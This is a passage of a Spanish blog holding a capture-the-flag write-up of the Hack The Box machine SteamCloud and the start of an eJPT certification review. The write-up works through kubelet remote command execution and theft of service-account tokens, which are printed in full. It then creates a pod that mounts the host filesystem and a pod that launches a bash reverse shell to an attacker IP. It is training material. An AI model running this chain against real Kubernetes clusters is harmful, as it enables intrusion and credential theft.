&gt; Muestra solo los puertos con un estatus “open” -sS &gt; Aplica un TCP SYN Scan –min-rate 5000 &gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo -vvv &gt; Muestra la información en pantalla a medida que se descubre -n &gt; Indica que no aplique resolución DNS -Pn &gt; Indica que no aplique el protocolo ARP 10.10.10.11.133 &gt; Dirección IP que se quiere escanear -oG allPorts &gt; Exporta el output a un fichero grepeable con nombre “allPorts”Este sería el output del comandoStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-20 22:13 CETScanning 10.10.11.133 [65535 ports]PORT STATE SERVICE REASON22/tcp open ssh syn-ack zsh:1: command not found: ttlttl 6380/tcp open http syn-ack ttl 632380/tcp open etcd-server syn-ack ttl 638443/tcp open https-alt syn-ack ttl 63Ahora vamos a realizar un escaneo más profundo, también con nmap pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.❯ nmap -p22,80,2380,8443 -sC -sV 10.10.11.133 -oN targeted -p22,80,2380,8443 &gt; Indica los puertos que se quieren escanear, en este caso el 22, 80, 2380 y 8443 -sC &gt; Lanza scripts básicos de enumeración -sV &gt; Enumera la versión y servicio que está corriendo en los puertos 10.10.10.133 &gt; Dirección IP que se quiere escanear -oN targeted &gt; Exporta el output a un fichero en formato nmap con nombre “targeted”Este sería el output del comando:Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-20 23:20 CETNmap scan report for 10.10.11.133PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)| 256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)|_ 256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Welcome to nginx!2380/tcp open ssl/etcd-server?| tls-alpn: |_ h2| ssl-cert: Subject: commonName=steamcloud| Not valid before: 2022-02-18T06:07:47|_Not valid after: 2023-02-18T06:07:47|_ssl-date: TLS randomness does not represent time8443/tcp open ssl/https-alt| fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden| Audit-Id: eeb68a72-4592-4223-9d3c-2ce2d188946c| Cache-Control: no-cache, private| Content-Type: application/json| X-Content-Type-Options: nosniff| X-Kubernetes-Pf-Flowschema-Uid: 8d512b1b-c9d1-48ff-89fd-f8bad492b299| X-Kubernetes-Pf-Prioritylevel-Uid: 77d1019f-b812-40a4-a4c6-c46d9794dba2| Date: Sun, 20 Feb 2022 22:38:13 GMT| Content-Length: 212\t\t\t\t\t---SKIP---Los puertos abiertos y sus servicios asocidados son: 22/tcp &gt; ssh 80/tcp &gt; http 2380/tcp &gt; ssl/etcd-server 8443/tcp &gt; ssl/https-altBusqueda de vulnerabilidadesSi analizamos los servicios web que alojan los puertos 80 y 8443 veremos que el 80 aloja una página web básica de nginx y el 8443 aloja otra en la que podemos ver que se esta usando kubernetes y que existe un usuario llamado “anonymous”.¿Qué es Kubernetes?Kubernetes es una plataforma de código abierto para administrar cargas de trabajo y servicios. Utilizando un entorno de administración enfocado en contenedores.Disponen de su propia herramienta kubectl, por lo que intento autenticarme con el usuario “anonymous” intentando además conseguir un poco de información sobre el cluster pero necesita una contraseña.❯ kubectl --server https://10.10.11.133:8443 cluster-infoPlease enter Username: anonymousPlease enter Password:Buscando acerca de Kubernetes encontré una herramienta en github llamada “Kubeletctl”, la podeis ver en el siguiente repositorio. Kubeletctl es una herramienta de línea de comando que implementa la API de Kubelet.Kubeletctl nos permite mostrar los pods del servidor de Kubernetes.❯ kubeletctl pods -s 10.10.11.133 pods &gt; Muestra la lista de pods -s 10.10.11.133 &gt; Indica la dirección IP del servidorObtenemos toda esta lista de pods del servidor┌────────────────────────────────────────────────────────────────────────────────┐│ Pods from Kubelet │├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤│ │ POD │ NAMESPACE │ CONTAINERS │├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤│ 1 │ etcd-steamcloud │ kube-system │ etcd ││ │ │ │ │├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤│ 2 │ kube-apiserver-steamcloud │ kube-system │ kube-apiserver ││ │ │ │ │├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤│ 3 │ kube-scheduler-steamcloud │ kube-system │ kube-scheduler ││ │ │ │ │├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤│ 4 │ nginx │ default │ nginx ││ │ │ │ │├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤│ 5 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager ││ │ │ │ │├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤│ 6 │ storage-provisioner │ kube-system │ storage-provisioner ││ │ │ │ │├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤│ 7 │ kube-proxy-fkss9 │ kube-system │ kube-proxy ││ │ │ │ │├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤│ 8 │ coredns-78fcd69978-mfjfc │ kube-system │ coredns ││ │ │ │ │├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤│ 9 │ michaelserra │ default │ michaelserra ││ │ │ │ │└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘También permite escanear el servidor en busqueda de containers vulnerables a RCE.❯ kubeletctl scan rce -s 10.10.11.133 scan rce &gt; Escanea los nodos de la API de Kubelet con la vulnerabilidad RCE. -s 10.10.11.133 &gt; Indica la dirección IP del servidorEl output nos muestra cuales son los containers vulnerables a un RCE┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐│ Node with pods vulnerable to RCE │├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤│ │ NODE IP │ PODS │ NAMESPACE │ CONTAINERS │ RCE │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ │ │ │ │ │ RUN │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 1 │ 10.10.11.133 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 2 │ │ storage-provisioner │ kube-system │ storage-provisioner │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 3 │ │ kube-proxy-fkss9 │ kube-system │ kube-proxy │ + │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 4 │ │ coredns-78fcd69978-mfjfc │ kube-system │ coredns │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 5 │ │ michaelserra │ default │ michaelserra │ + │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 6 │ │ etcd-steamcloud │ kube-system │ etcd │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 7 │ │ kube-apiserver-steamcloud │ kube-system │ kube-apiserver │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 8 │ │ kube-scheduler-steamcloud │ kube-system │ kube-scheduler │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 9 │ │ nginx │ default │ nginx │ + │└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘ExplotaciónYa sabiendo que containers son vulnerables a un RCE podemos elegir el que queramos y ejecutar comandos en el, en este caso yo he utilizado el nginx.❯ kubeletctl run \"id\" -p nginx -c nginx -s 10.10.11.133 run “id” &gt; Indica el comando que vas a querer ejecutar -p nginx &gt; Indica el POD -c nginx &gt; Indica el container -s 10.10.11.133 &gt; Indica la dirección IP del servidorSorprendentemente estamos ejecutando comandos como el usuario rootuid=0(root) gid=0(root) groups=0(root)Podemos ver la flag del usuario❯ kubeletctl run \"cat /root/user.txt\" -p nginx -c nginx -s 10.10.11.133705ad31f80c6532b****************Post-explotaciónInvestigando un poco me encontré con este post de HackTricks. En él indica que existe un objeto llamado “ServiceAccount” que es el que le proporciona un ID a un proceso que se este ejecutando dentro de un POD, este objeto es manejado automaticamente por Kubernetes, por lo que cuando no se le proporciona el atributo “ServiceAccount” al crear un nuevo POD se asigna en unos directorios predeterminados.Estos directorios son: /run/secrets/kubernetes.io/serviceaccount /var/run/secrets/kubernetes.io/serviceaccount /secrets/kubernetes.io/serviceaccountTodos estos directorios tienen unos archivos en común: ca.crt &gt; Certificado que comprueba las comunicaciones de Kubernetes namespace &gt; Indica la configuración de nombres actual token &gt; Contiene el token del POD actualPara poder autenticarnos contra el cluster solamente necesitamos los archivos ca.crt y token. Vamos a guardarnos ambos archivos en local.❯ kubeletctl run \"cat /run/secrets/kubernetes.io/serviceaccount/ca.crt\" -p nginx -c nginx -s 10.10.11.133 &gt; ca.crt❯ kubeletctl run \"cat /run/secrets/kubernetes.io/serviceaccount/token\" -p nginx -c nginx -s 10.10.11.133 &gt; tokenEn el siguiente post viene explicada la autenticación en Kubernetes.❯ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlVhbHFtQWtCZjJuN0hwMUJ2djFaVm85ekRxamhCcHV4bGcxLWtEdnhWSmMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3MTMyNDIxLCJpYXQiOjE2NDU1OTY0MjEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjZlYjE0ZTZjLTAwNWUtNDcxYi05NTUzLTE4MTY5N2FlYzhhNCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjQyMTI4YTY2LTUyYjctNDFhZi1hMjY3LWJiYTFkNGU3MzFlZCJ9LCJ3YXJuYWZ0ZXIiOjE2NDU2MDAwMjh9LCJuYmYiOjE2NDU1OTY0MjEsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.inJpZWoQ4ZR4l4PGJSXmlIz_uEt0-D_3r-DMyksyxmMNAKaNWHzd4GhCwSuw0r1XugTQymm0opbw4CFVizQ07QeFJCx0uL2kNbrz3o70OPU1yycCDsYjudzQu-8JfA7-LB4F3WDiZbWtFlYNnAHiVhJo4O3IBhfikQXHEDKptrMTQHSSbOq8ud2OBIYXq_ZVEqX6gaiAXMLOi-oNKB1NUzdmqJXUYpZYsIUCRc_kmQDLXhZn0JTWdqLHaqiCIlg65c2HI9Iz52hv3LRGmDTL7xrLvgp8v5q8iuO-TRXilrc1qeBdKVbuCC_Gbe92-FhqYwgOzh5LlrYcLHxD9ePsWQ get podNAME READY STATUS RESTARTS AGEnginx 1/1 Running 0 15m –server https://10.10.11.133:8443 &gt; Indica la dirección URL del servidor –certificate-authority=ca.crt &gt; Indica la ruta del certicado de las comunicaciones de Kubernetes –token=&lt;token&gt; &gt; Indica el Token del POD get pod &gt; Muestra información sobre el PODSi intentamos conseguir otra información como “cluser-info” no vamos a poder conseguirla porque no tenemos permisos❯ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3MzY2NTM3LCJpYXQiOjE2NDU4MzA1MzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4MzQxNDR9LCJuYmYiOjE2NDU4MzA1MzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.pp_KAAchJDZRkGdgknJ6VykWnbSfhXrwgBYZgyrC00Ma2UkzfeVAYXf0FrdBWMdQ2tkhPow8Fdr17KK41ZMmfUN73JjxDkmYqBD8kbJuru70SJUVRzQsxXCjL8BdvWprHSz7v7DNuhJtxZucD5tME2Yrr0Hv60d9C2k1hQcHoiAJ1sx92oXzhCRGbWeV9L4LTFlq8uDpPSzJWDx3_xeT44tGCL4uvoW9iTCEX5AoO9zjMivPS6Hsj_AYRQaghHfzbEo5hTC48LMrp43m1id6AyZ7kcg2ArIbN4GPPRRSnG6tH-huE5QijFgRhGp8mdJ6f-dH5x2wxGsLK97cPsZdQA cluster-infoTo further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.Error from server (Forbidden): services is forbidden: User \"system:serviceaccount:default:default\" cannot list resource \"services\" in API group \"\" in the namespace \"kube-system\"Kubectl tiene un comando llamado auth can-i que es utilizado para listar los permisos de la cuenta actual❯ kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3MzY2NTM3LCJpYXQiOjE2NDU4MzA1MzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4MzQxNDR9LCJuYmYiOjE2NDU4MzA1MzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.pp_KAAchJDZRkGdgknJ6VykWnbSfhXrwgBYZgyrC00Ma2UkzfeVAYXf0FrdBWMdQ2tkhPow8Fdr17KK41ZMmfUN73JjxDkmYqBD8kbJuru70SJUVRzQsxXCjL8BdvWprHSz7v7DNuhJtxZucD5tME2Yrr0Hv60d9C2k1hQcHoiAJ1sx92oXzhCRGbWeV9L4LTFlq8uDpPSzJWDx3_xeT44tGCL4uvoW9iTCEX5AoO9zjMivPS6Hsj_AYRQaghHfzbEo5hTC48LMrp43m1id6AyZ7kcg2ArIbN4GPPRRSnG6tH-huE5QijFgRhGp8mdJ6f-dH5x2wxGsLK97cPsZdQAResources Non-Resource URLs Resource Names Verbsselfsubjectaccessreviews.authorization.k8s.io [] [] [create]selfsubjectrulesreviews.authorization.k8s.io [] [] [create]pods [] [] [get create list]\t\t\t\t\t---SKIP---La línea que más nos importa es la tercera, en ella muestra que tenemos los permisos get, create y list sobre los pods. Gracias a que tenemos el permiso de listar podemos conseguir información sobre el pod actual.❯ kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Mzg0MDc3LCJpYXQiOjE2NDU4NDgwNzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4NTE2ODR9LCJuYmYiOjE2NDU4NDgwNzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LDdoY3-pAoiJIuwESDlxYwb3oYLfUQnimhJ7SkQLVnVeAY_E4aTqCCFV7an8jtvJPJW5yBoQONA0HIWPEAp8quEJAiiOJb9SMdBFt5bTa8Lu5Fqdn_PiMo1YpVOlKPkdcM7QCcOPDapfjs-MYCJgE4_3E8UQd3pp2Q0p093FBjmebZaWHeew1PDQEsMUDPnJZhVUyyZmFtyYyxD5wrHb83QrvsV79X-VMHmKg0B3LQi26E4wM2oQ2eksEmBjUmt8CxE2-8Aky9QZv1ZmDlV5U7TCwXCJWslx7-kgtctqa749B2VLDzMjEroX70yz7mrSulKmCxM6E71jhkUl-cO0zAapiVersion: v1kind: Podmetadata: annotations: kubectl.kubernetes.io/last-applied-configuration: | {\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"volumeMounts\":[{\"mountPath\":\"/root\",\"name\":\"flag\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/opt/flag\"},\"name\":\"flag\"}]}} creationTimestamp: \"2022-02-25T06:07:01Z\" name: nginx namespace: default resourceVersion: \"519\" uid: 24721c90-131b-4e36-942f-49a9bfdf674cspec: containers: - image: nginx:1.14.2 imagePullPolicy: Never name: nginx resources: {} terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /root name: flag - mountPath: /var/run/secrets/kubernetes.io/serviceaccount name: kube-api-access-zxdkw readOnly: true\t\t\t\t\t---SKIP---Los datos más importantes son: namespace &gt; default image &gt; nginx:1.14.2Procedemos a crear un nuevo pod que este montado en la raíz de los archivos, es decir, en “/”. Cuando ejecutemos el pod tendremos acceso a todo el sistema de archivos.apiVersion: v1 kind: Podmetadata: name: xdann1 namespace: defaultspec: containers: - name: xdann1 image: nginx:1.14.2 volumeMounts: - mountPath: /mnt name: hostfs volumes: - name: hostfs hostPath: path: / automountServiceAccountToken: true hostNetwork: truePrimero tendremos que cargar el pod para luego poder ejecutarlo❯ kubectl apply -f xdann1.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Mzg0MDc3LCJpYXQiOjE2NDU4NDgwNzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4NTE2ODR9LCJuYmYiOjE2NDU4NDgwNzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LDdoY3-pAoiJIuwESDlxYwb3oYLfUQnimhJ7SkQLVnVeAY_E4aTqCCFV7an8jtvJPJW5yBoQONA0HIWPEAp8quEJAiiOJb9SMdBFt5bTa8Lu5Fqdn_PiMo1YpVOlKPkdcM7QCcOPDapfjs-MYCJgE4_3E8UQd3pp2Q0p093FBjmebZaWHeew1PDQEsMUDPnJZhVUyyZmFtyYyxD5wrHb83QrvsV79X-VMHmKg0B3LQi26E4wM2oQ2eksEmBjUmt8CxE2-8Aky9QZv1ZmDlV5U7TCwXCJWslx7-kgtctqa749B2VLDzMjEroX70yz7mrSulKmCxM6E71jhkUl-cO0zApod/xdann1 createdVamos a listar los pods existentes❯ kubeletctl scan rce -s 10.10.11.133 scan rce &gt; Escanea los nodos de la API de Kubelet con la vulnerabilidad RCE. -s 10.10.11.133 &gt; Indica la dirección IP del servidor┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐│ Node with pods vulnerable to RCE │├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤│ │ NODE IP │ PODS │ NAMESPACE │ CONTAINERS │ RCE │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ │ │ │ │ │ RUN │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 1 │ 10.10.11.133 │ kube-apiserver-steamcloud │ kube-system │ kube-apiserver │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 2 │ │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 3 │ │ kube-scheduler-steamcloud │ kube-system │ kube-scheduler │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 4 │ │ xdann1 │ default │ xdann1 │ + │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 5 │ │ nginx │ default │ nginx │ + │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 6 │ │ etcd-steamcloud │ kube-system │ etcd │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 7 │ │ storage-provisioner │ kube-system │ storage-provisioner │ - │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 8 │ │ kube-proxy-9nvcj │ kube-system │ kube-proxy │ + │├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤│ 9 │ │ coredns-78fcd69978-szddh │ kube-system │ coredns │ - │└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘Ya podemos ver que se ha creado correctamente el pod, por lo que procedemos a ejecutar comandos sobre el.❯ kubeletctl run \"pwd\" -s 10.10.11.133 -p xdann1 -p xdann1 -c xdann1Podemos leer la bandera de root❯ kubeletctl run \"cat /mnt/root/root.txt\" -s 10.10.11.133 -p xdann1 -p xdann1 -c xdann1b8e39d9290d5c7******************Ya tenemos todas las flags pero nos falta acceder a la máquina. Simplemente tendremos que crear un nuevo pod pero esta vez tendremos que hacer que ejecute una reverse shell cuando se cargue.apiVersion: v1kind: Podmetadata: name: reverse namespace: defaultspec: containers: - name: reverse image: nginx:1.14.2 command: [\"/bin/bash\"] args: [\"-c\", \"/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.246/443 0&gt;&amp;1\"] volumeMounts: - mountPath: /mnt name: hostfs volumes: - name: hostfs hostPath: path: / automountServiceAccountToken: true hostNetwork: trueNos ponemos en escucha❯ nc -nlvp 443Cargamos el nuevo pod con la reverse-shell❯ kubectl apply -f reverse.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Mzg0MDc3LCJpYXQiOjE2NDU4NDgwNzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4NTE2ODR9LCJuYmYiOjE2NDU4NDgwNzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LDdoY3-pAoiJIuwESDlxYwb3oYLfUQnimhJ7SkQLVnVeAY_E4aTqCCFV7an8jtvJPJW5yBoQONA0HIWPEAp8quEJAiiOJb9SMdBFt5bTa8Lu5Fqdn_PiMo1YpVOlKPkdcM7QCcOPDapfjs-MYCJgE4_3E8UQd3pp2Q0p093FBjmebZaWHeew1PDQEsMUDPnJZhVUyyZmFtyYyxD5wrHb83QrvsV79X-VMHmKg0B3LQi26E4wM2oQ2eksEmBjUmt8CxE2-8Aky9QZv1ZmDlV5U7TCwXCJWslx7-kgtctqa749B2VLDzMjEroX70yz7mrSulKmCxM6E71jhkUl-cO0zApod/reverse createdY ya hemos conseguido acceso a la máquinaroot@steamcloud:/# hostnamesteamcloud" }, { "title": "eJPT/PTS Review", "url": "/posts/ejpt-pts-review/", "categories": "Review, Certificación", "tags": "Certificación, Pentesting, eJPT", "date": "2022-04-20 00:00:00 +0200", "snippet": "IntroducciónRecientemente conseguí la cerfificación eJPT (eLearnSecurity Junior Penetration Tester) de eLearnSecurity, por lo que quería compartir mi experiencia personal sobre esta certificación.Curso PTSPTS (Penetration Testing Student) es el curso oficial para la certificación eJPT, es un curso totalmente gratuito que te introduce en el mundo de las pruebas de penetración, además te puede servir para preparar el examen del eJPT. El curso esta dividido en 3 secciones principales, estas secciones a su vez se componen de módulos. Cada modulo puede tener varios tipos de contenidos, diapositivas, videos y laboratorios.A continuación dejo descritos los tres módulos: Penetration Testing Prerequisites: este primer módulo nos introduce fundamentos de redes y aplicaciones web, considero este módulo muy importante si no se tiene mucho conocimiento. Penetration Testing: Preliminary Skills &amp; Programming: este módulo ofrece los fundamentos sobre C++, Python y Bash. Este módulo te puede ser muy útil si no estabas familiarizado con algunos de los lenguajes mencionados. Penetration Testing Basics: este último módulo cubre los principales ataques, herramientas y técnicas utilizadas durante una prueba de penetración.En la útlima versión del curso introdujeron una nueva sección en la que hay varios laboratorios, 3 de estos laboratorios son black boxs en los que se pueden practicar los conocimientos adquiridos en el curso, personalmente me parecieron más dificiles que el propio examen. Te recomiendo que hagas todos los labs del curso, de esta forma podr s asentar los conocimiento adquiridos anteriormente.Aún así el curso tiene algunos puntos negativos desde mi punto de vista, el primero de los problemas que le encuentro al curso es que algunos conceptos se enseñan con software obsoleto o con herramientas automáticas, la última pega que le tengo al curso es que a la hora de comenzar con un laboratorio no se te proporciona un archivo con el que puedas conectarte a su red, sino que tienes que acceder a una máquina desde tu propio navegador, a mi personalmente esta última opción se me hace bastante incomoda.Experiencia PreviaAntes de empezar el examen contaba con 30 máquinas hechas en Hack The Box y otras cuantas de otras plataformas. No creo que sea necesario tener una gran cantidad de máquinas hechas, ya que el examen no es exactamente lo que se podría esperar de un CTF. Donde realmente está el quid de la cuestión para superar el examen es en tener definida una buena metodología de pentesting con la que te puedas sentir comodo y ser eficaz.Examen eJPTActualmente, el examen para conseguir la certificación eJPT cuesta 200$, al cambio a euros son 184,94€.Una vez comprado el ticket del examen tendrás 180 días para activar el examen. Cuando comienzes el examen dispondras de 3 días para terminarlo, aunque normalmente se termina mucho antes, entre 6 a 10 horas.Al comenzar el examen se te entregarán unos archivos, entre ellos hay una carta de compromiso en la que se nos explica que el examen consiste en una prueba de penetración de tipo black box a una empresa, en la que tendrás que comprometer varios equipos.El examen consiste en responder 20 preguntas, estas preguntas son de tipo de test, siendo algunas de respuesta multiple y otras de respuesta única, la solución de cada pregunta la irás encontrando a medida de que vulneres distintos equipos . Para aprobar el examen tendrás que responder 15 preguntas bien, la nota del examen se te entregará automaticamente luego de entregarlo.Por 